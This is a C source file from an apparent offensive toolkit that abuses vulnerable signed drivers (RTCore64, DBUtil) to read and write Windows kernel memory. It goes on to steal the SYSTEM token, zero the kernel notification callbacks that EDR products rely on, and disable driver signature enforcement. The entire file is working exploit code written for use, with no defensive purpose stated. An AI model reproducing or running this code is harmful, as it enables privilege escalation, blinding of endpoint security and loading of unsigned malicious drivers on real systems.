/*
 * kernel_ops.c — CHEYANNE BYOVD Kernel Operations
 * 22DIV / george wu
 *
 * Arbitrary kernel R/W via vulnerable driver IOCTLs.
 * Token stealing, EPROCESS walking, callback removal, DSE bypass.
 *
 * Target: Windows 11 24H2 Build 26200
 */

#include "byovd.h"
#include <psapi.h>
#include <stdio.h>

/* ================================================================
 * KERNEL R/W PRIMITIVES
 * ================================================================ */

BOOL kread32(BYOVD_CTX *ctx, ULONGLONG addr, DWORD *out)
{
    DWORD bytes_ret = 0;

    if (ctx->driver == DRIVER_RTCORE64) {
        RTCORE_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        buf.size = 4;
        if (!DeviceIoControl(ctx->hDevice, RTCORE_IOCTL_READ,
                &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL))
            return FALSE;
        *out = buf.value;
        return TRUE;
    }

    if (ctx->driver == DRIVER_DBUTIL23) {
        DBUTIL_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        if (!DeviceIoControl(ctx->hDevice, DBUTIL_IOCTL_READ,
                &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL))
            return FALSE;
        *out = (DWORD)buf.value;
        return TRUE;
    }

    return FALSE;
}

BOOL kread64(BYOVD_CTX *ctx, ULONGLONG addr, ULONGLONG *out)
{
    DWORD bytes_ret = 0;

    if (ctx->driver == DRIVER_RTCORE64) {
        DWORD lo, hi;
        if (!kread32(ctx, addr, &lo)) return FALSE;
        if (!kread32(ctx, addr + 4, &hi)) return FALSE;
        *out = ((ULONGLONG)hi << 32) | lo;
        return TRUE;
    }

    if (ctx->driver == DRIVER_DBUTIL23) {
        DBUTIL_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        if (!DeviceIoControl(ctx->hDevice, DBUTIL_IOCTL_READ,
                &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL))
            return FALSE;
        *out = buf.value;
        return TRUE;
    }

    return FALSE;
}

BOOL kwrite32(BYOVD_CTX *ctx, ULONGLONG addr, DWORD val)
{
    DWORD bytes_ret = 0;

    if (ctx->driver == DRIVER_RTCORE64) {
        RTCORE_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        buf.size = 4;
        buf.value = val;
        return DeviceIoControl(ctx->hDevice, RTCORE_IOCTL_WRITE,
            &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL);
    }

    if (ctx->driver == DRIVER_DBUTIL23) {
        DBUTIL_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        buf.value = (ULONGLONG)val;
        return DeviceIoControl(ctx->hDevice, DBUTIL_IOCTL_WRITE,
            &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL);
    }

    return FALSE;
}

BOOL kwrite64(BYOVD_CTX *ctx, ULONGLONG addr, ULONGLONG val)
{
    if (ctx->driver == DRIVER_RTCORE64) {
        if (!kwrite32(ctx, addr, (DWORD)(val & 0xFFFFFFFF))) return FALSE;
        return kwrite32(ctx, addr + 4, (DWORD)(val >> 32));
    }

    if (ctx->driver == DRIVER_DBUTIL23) {
        DWORD bytes_ret = 0;
        DBUTIL_BUFFER buf;
        memset(&buf, 0, sizeof(buf));
        buf.address = addr;
        buf.value = val;
        return DeviceIoControl(ctx->hDevice, DBUTIL_IOCTL_WRITE,
            &buf, sizeof(buf), &buf, sizeof(buf), &bytes_ret, NULL);
    }

    return FALSE;
}

BOOL kread_buf(BYOVD_CTX *ctx, ULONGLONG addr, void *buf, DWORD size)
{
    BYTE *dst = (BYTE *)buf;
    DWORD i;

    for (i = 0; i + 4 <= size; i += 4) {
        DWORD val;
        if (!kread32(ctx, addr + i, &val)) return FALSE;
        memcpy(dst + i, &val, 4);
    }

    for (; i < size; i++) {
        DWORD val;
        if (!kread32(ctx, addr + i, &val)) return FALSE;
        dst[i] = (BYTE)(val & 0xFF);
    }

    return TRUE;
}

/* ================================================================
 * NTOSKRNL BASE — via EnumDeviceDrivers (user-mode API)
 * ================================================================ */

BOOL kernel_find_ntoskrnl(BYOVD_CTX *ctx)
{
    LPVOID drivers[1024];
    DWORD needed;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        printf("  [!] EnumDeviceDrivers failed (%lu)\n", GetLastError());
        return FALSE;
    }

    ctx->ntoskrnl_base = (ULONGLONG)drivers[0];
    printf("  [+] ntoskrnl base: 0x%llX\n", ctx->ntoskrnl_base);
    return TRUE;
}

/* ================================================================
 * PsInitialSystemProcess — exported symbol in ntoskrnl
 * Contains a pointer to the System (PID 4) EPROCESS
 * ================================================================ */

BOOL kernel_find_system_eprocess(BYOVD_CTX *ctx)
{
    if (!ctx->ntoskrnl_base) {
        if (!kernel_find_ntoskrnl(ctx)) return FALSE;
    }

    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", NULL,
        DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        printf("  [!] Failed to load ntoskrnl.exe in usermode (%lu)\n", GetLastError());
        return FALSE;
    }

    ULONGLONG proc_offset = (ULONGLONG)GetProcAddress(hNtos, "PsInitialSystemProcess");
    if (!proc_offset) {
        printf("  [!] PsInitialSystemProcess not found\n");
        FreeLibrary(hNtos);
        return FALSE;
    }

    ULONGLONG rva = proc_offset - (ULONGLONG)hNtos;
    FreeLibrary(hNtos);

    ULONGLONG kernel_addr = ctx->ntoskrnl_base + rva;

    if (!kread64(ctx, kernel_addr, &ctx->eprocess_system)) {
        printf("  [!] Failed to read PsInitialSystemProcess at 0x%llX\n", kernel_addr);
        return FALSE;
    }

    DWORD verify_pid;
    if (!kread32(ctx, ctx->eprocess_system + EPROCESS_UNIQUE_PID, &verify_pid)) {
        printf("  [!] Failed to read System PID\n");
        return FALSE;
    }

    if (verify_pid != 4) {
        printf("  [!] PsInitialSystemProcess PID = %u (expected 4) — offset mismatch\n", verify_pid);
        return FALSE;
    }

    printf("  [+] System EPROCESS: 0x%llX (PID %u verified)\n",
        ctx->eprocess_system, verify_pid);
    return TRUE;
}

/* ================================================================
 * EPROCESS WALK — traverse ActiveProcessLinks doubly-linked list
 * ================================================================ */

BOOL kernel_find_eprocess_by_pid(BYOVD_CTX *ctx, DWORD pid, ULONGLONG *eprocess_out)
{
    if (!ctx->eprocess_system) {
        if (!kernel_find_system_eprocess(ctx)) return FALSE;
    }

    ULONGLONG head = ctx->eprocess_system + EPROCESS_ACTIVE_LINKS;
    ULONGLONG current_link;

    if (!kread64(ctx, head, &current_link)) {
        printf("  [!] Failed to read ActiveProcessLinks\n");
        return FALSE;
    }

    int walked = 0;
    while (current_link != head && walked < 4096) {
        ULONGLONG eprocess = current_link - EPROCESS_ACTIVE_LINKS;
        DWORD current_pid;

        if (!kread32(ctx, eprocess + EPROCESS_UNIQUE_PID, &current_pid))
            break;

        if (current_pid == pid) {
            *eprocess_out = eprocess;
            printf("  [+] Found EPROCESS for PID %u at 0x%llX\n", pid, eprocess);
            return TRUE;
        }

        if (!kread64(ctx, current_link, &current_link))
            break;

        walked++;
    }

    printf("  [!] PID %u not found in EPROCESS list (%d walked)\n", pid, walked);
    return FALSE;
}

/* ================================================================
 * TOKEN STEALING — copy SYSTEM token to target process
 *
 * Token field in EPROCESS is an EX_FAST_REF:
 *   bottom 4 bits = reference count, top 60 bits = pointer
 *   mask with ~0xF to get the actual token pointer
 * ================================================================ */

BOOL kernel_steal_token(BYOVD_CTX *ctx, DWORD target_pid)
{
    if (!ctx->eprocess_system) {
        if (!kernel_find_system_eprocess(ctx)) return FALSE;
    }

    ULONGLONG system_token;
    if (!kread64(ctx, ctx->eprocess_system + EPROCESS_TOKEN, &system_token)) {
        printf("  [!] Failed to read System token\n");
        return FALSE;
    }

    ULONGLONG target_eprocess;
    if (!kernel_find_eprocess_by_pid(ctx, target_pid, &target_eprocess))
        return FALSE;

    ULONGLONG old_token;
    if (!kread64(ctx, target_eprocess + EPROCESS_TOKEN, &old_token)) {
        printf("  [!] Failed to read target token\n");
        return FALSE;
    }

    ULONGLONG token_ptr = system_token & ~0xFULL;
    ULONGLONG ref_bits = old_token & 0xFULL;
    ULONGLONG new_token = token_ptr | ref_bits;

    if (!kwrite64(ctx, target_eprocess + EPROCESS_TOKEN, new_token)) {
        printf("  [!] Failed to write token\n");
        return FALSE;
    }

    printf("  [+] Token stolen: PID %u now has SYSTEM token\n", target_pid);
    printf("      old: 0x%llX -> new: 0x%llX\n", old_token, new_token);
    return TRUE;
}

/* ================================================================
 * CALLBACK REMOVAL — zero EDR kernel notification callbacks
 *
 * Resolves PspCreateProcessNotifyRoutine, PspCreateThreadNotifyRoutine,
 * PspLoadImageNotifyRoutine via pattern scan of ntoskrnl.
 *
 * Each is an array of up to 64 EX_CALLBACK_ROUTINE_BLOCK pointers.
 * Zeroing them blinds any kernel-mode EDR that registered via
 * PsSetCreateProcessNotifyRoutine(Ex), etc.
 * ================================================================ */

static ULONGLONG find_pattern(BYOVD_CTX *ctx, ULONGLONG start, DWORD scan_size,
    const BYTE *pattern, const BYTE *mask, DWORD pat_len)
{
    BYTE *page = (BYTE *)malloc(scan_size);
    if (!page) return 0;

    if (!kread_buf(ctx, start, page, scan_size)) {
        free(page);
        return 0;
    }

    for (DWORD i = 0; i + pat_len <= scan_size; i++) {
        BOOL found = TRUE;
        for (DWORD j = 0; j < pat_len; j++) {
            if (mask[j] == 'x' && page[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            free(page);
            return start + i;
        }
    }

    free(page);
    return 0;
}

BOOL kernel_remove_callbacks(BYOVD_CTX *ctx)
{
    if (!ctx->ntoskrnl_base) {
        if (!kernel_find_ntoskrnl(ctx)) return FALSE;
    }

    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", NULL,
        DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) return FALSE;

    const char *symbols[] = {
        "PsSetCreateProcessNotifyRoutine",
        "PsSetCreateThreadNotifyRoutine",
        "PsSetLoadImageNotifyRoutine",
    };
    const char *names[] = {
        "PspCreateProcessNotifyRoutine",
        "PspCreateThreadNotifyRoutine",
        "PspLoadImageNotifyRoutine",
    };

    int total_removed = 0;

    for (int s = 0; s < 3; s++) {
        ULONGLONG func_addr_user = (ULONGLONG)GetProcAddress(hNtos, symbols[s]);
        if (!func_addr_user) {
            printf("  [!] %s not found\n", symbols[s]);
            continue;
        }

        ULONGLONG rva = func_addr_user - (ULONGLONG)hNtos;
        ULONGLONG func_addr_kernel = ctx->ntoskrnl_base + rva;

        /*
         * The PsSet*NotifyRoutine functions reference their internal
         * Psp*NotifyRoutine array via LEA instructions.
         * Scan the first 256 bytes of the function for a LEA r??, [rip+disp32]
         * pattern: 4C 8D 2D or 48 8D 0D or 4C 8D 25 (variant encodings)
         */
        BYTE func_bytes[256];
        if (!kread_buf(ctx, func_addr_kernel, func_bytes, sizeof(func_bytes))) {
            printf("  [!] Failed to read %s body\n", symbols[s]);
            continue;
        }

        ULONGLONG array_addr = 0;
        for (int i = 0; i + 7 < (int)sizeof(func_bytes); i++) {
            /* LEA reg, [RIP+disp32] — look for common REX.W + 8D opcodes */
            if ((func_bytes[i] == 0x48 || func_bytes[i] == 0x4C) &&
                func_bytes[i + 1] == 0x8D &&
                (func_bytes[i + 2] & 0xC7) == 0x05) {
                /* RIP-relative: target = rip + 7 + disp32 */
                INT32 disp = *(INT32 *)&func_bytes[i + 3];
                array_addr = func_addr_kernel + i + 7 + disp;
                break;
            }
        }

        if (!array_addr) {
            printf("  [!] Could not find %s array reference\n", names[s]);
            continue;
        }

        printf("  [*] %s at 0x%llX\n", names[s], array_addr);

        int removed = 0;
        for (int i = 0; i < 64; i++) {
            ULONGLONG entry;
            if (!kread64(ctx, array_addr + i * 8, &entry)) break;
            if (entry == 0) continue;

            if (kwrite64(ctx, array_addr + i * 8, 0)) {
                removed++;
            }
        }

        printf("  [+] %s: zeroed %d callback(s)\n", names[s], removed);
        total_removed += removed;
    }

    FreeLibrary(hNtos);
    printf("  [+] Total callbacks removed: %d\n", total_removed);
    return total_removed > 0;
}

/* ================================================================
 * DSE BYPASS — disable Driver Signature Enforcement
 *
 * Writes 0 to CI!g_CiOptions, allowing unsigned driver loads.
 * Must restore quickly — PatchGuard checks this periodically.
 * ================================================================ */

static ULONGLONG g_CiOptions_addr = 0;
static DWORD g_CiOptions_original = 0;

BOOL kernel_dse_disable(BYOVD_CTX *ctx)
{
    HMODULE hCI = LoadLibraryExA("CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hCI) {
        printf("  [!] Failed to load CI.dll (%lu)\n", GetLastError());
        return FALSE;
    }

    ULONGLONG ci_base_user = (ULONGLONG)hCI;

    LPVOID drivers[1024];
    DWORD needed;
    EnumDeviceDrivers(drivers, sizeof(drivers), &needed);
    int count = needed / sizeof(LPVOID);

    ULONGLONG ci_base_kernel = 0;
    for (int i = 0; i < count; i++) {
        char name[256];
        if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name))) {
            if (_stricmp(name, "CI.dll") == 0) {
                ci_base_kernel = (ULONGLONG)drivers[i];
                break;
            }
        }
    }

    if (!ci_base_kernel) {
        printf("  [!] CI.dll not found in driver list\n");
        FreeLibrary(hCI);
        return FALSE;
    }

    printf("  [*] CI.dll kernel base: 0x%llX\n", ci_base_kernel);

    /*
     * g_CiOptions is not exported. Scan CI.dll .data section for the
     * variable referenced by CiInitialize.
     * Pattern: mov dword ptr [rip+disp32], ecx  (89 0D xx xx xx xx)
     * in CiInitialize's prologue, setting g_CiOptions.
     */
    ULONGLONG ci_init_user = (ULONGLONG)GetProcAddress(hCI, "CiInitialize");
    if (!ci_init_user) {
        printf("  [!] CiInitialize not found\n");
        FreeLibrary(hCI);
        return FALSE;
    }

    ULONGLONG ci_init_rva = ci_init_user - ci_base_user;
    ULONGLONG ci_init_kernel = ci_base_kernel + ci_init_rva;

    BYTE func_bytes[512];
    if (!kread_buf(ctx, ci_init_kernel, func_bytes, sizeof(func_bytes))) {
        printf("  [!] Failed to read CiInitialize\n");
        FreeLibrary(hCI);
        return FALSE;
    }

    for (int i = 0; i + 6 < (int)sizeof(func_bytes); i++) {
        /* mov [rip+disp32], ecx  or  mov [rip+disp32], eax */
        if (func_bytes[i] == 0x89 &&
            (func_bytes[i + 1] == 0x0D || func_bytes[i + 1] == 0x05)) {
            INT32 disp = *(INT32 *)&func_bytes[i + 2];
            g_CiOptions_addr = ci_init_kernel + i + 6 + disp;
            break;
        }
    }

    FreeLibrary(hCI);

    if (!g_CiOptions_addr) {
        printf("  [!] g_CiOptions not found via pattern scan\n");
        return FALSE;
    }

    if (!kread32(ctx, g_CiOptions_addr, &g_CiOptions_original)) {
        printf("  [!] Failed to read g_CiOptions\n");
        return FALSE;
    }

    printf("  [*] g_CiOptions at 0x%llX = 0x%X\n", g_CiOptions_addr, g_CiOptions_original);

    if (!kwrite32(ctx, g_CiOptions_addr, CI_OPTIONS_DISABLED)) {
        printf("  [!] Failed to write g_CiOptions\n");
        return FALSE;
    }

    printf("  [+] DSE DISABLED (g_CiOptions = 0x0)\n");
    printf("  [!] RESTORE QUICKLY — PatchGuard will check\n");
    return TRUE;
}

BOOL kernel_dse_restore(BYOVD_CTX *ctx)
{
    if (!g_CiOptions_addr || !g_CiOptions_original) {
        printf("  [!] No saved g_CiOptions state\n");
        return FALSE;
    }

    if (!kwrite32(ctx, g_CiOptions_addr, g_CiOptions_original)) {
        printf("  [!] Failed to restore g_CiOptions\n");
        return FALSE;
    }

    printf("  [+] DSE RESTORED (g_CiOptions = 0x%X)\n", g_CiOptions_original);
    return TRUE;
}
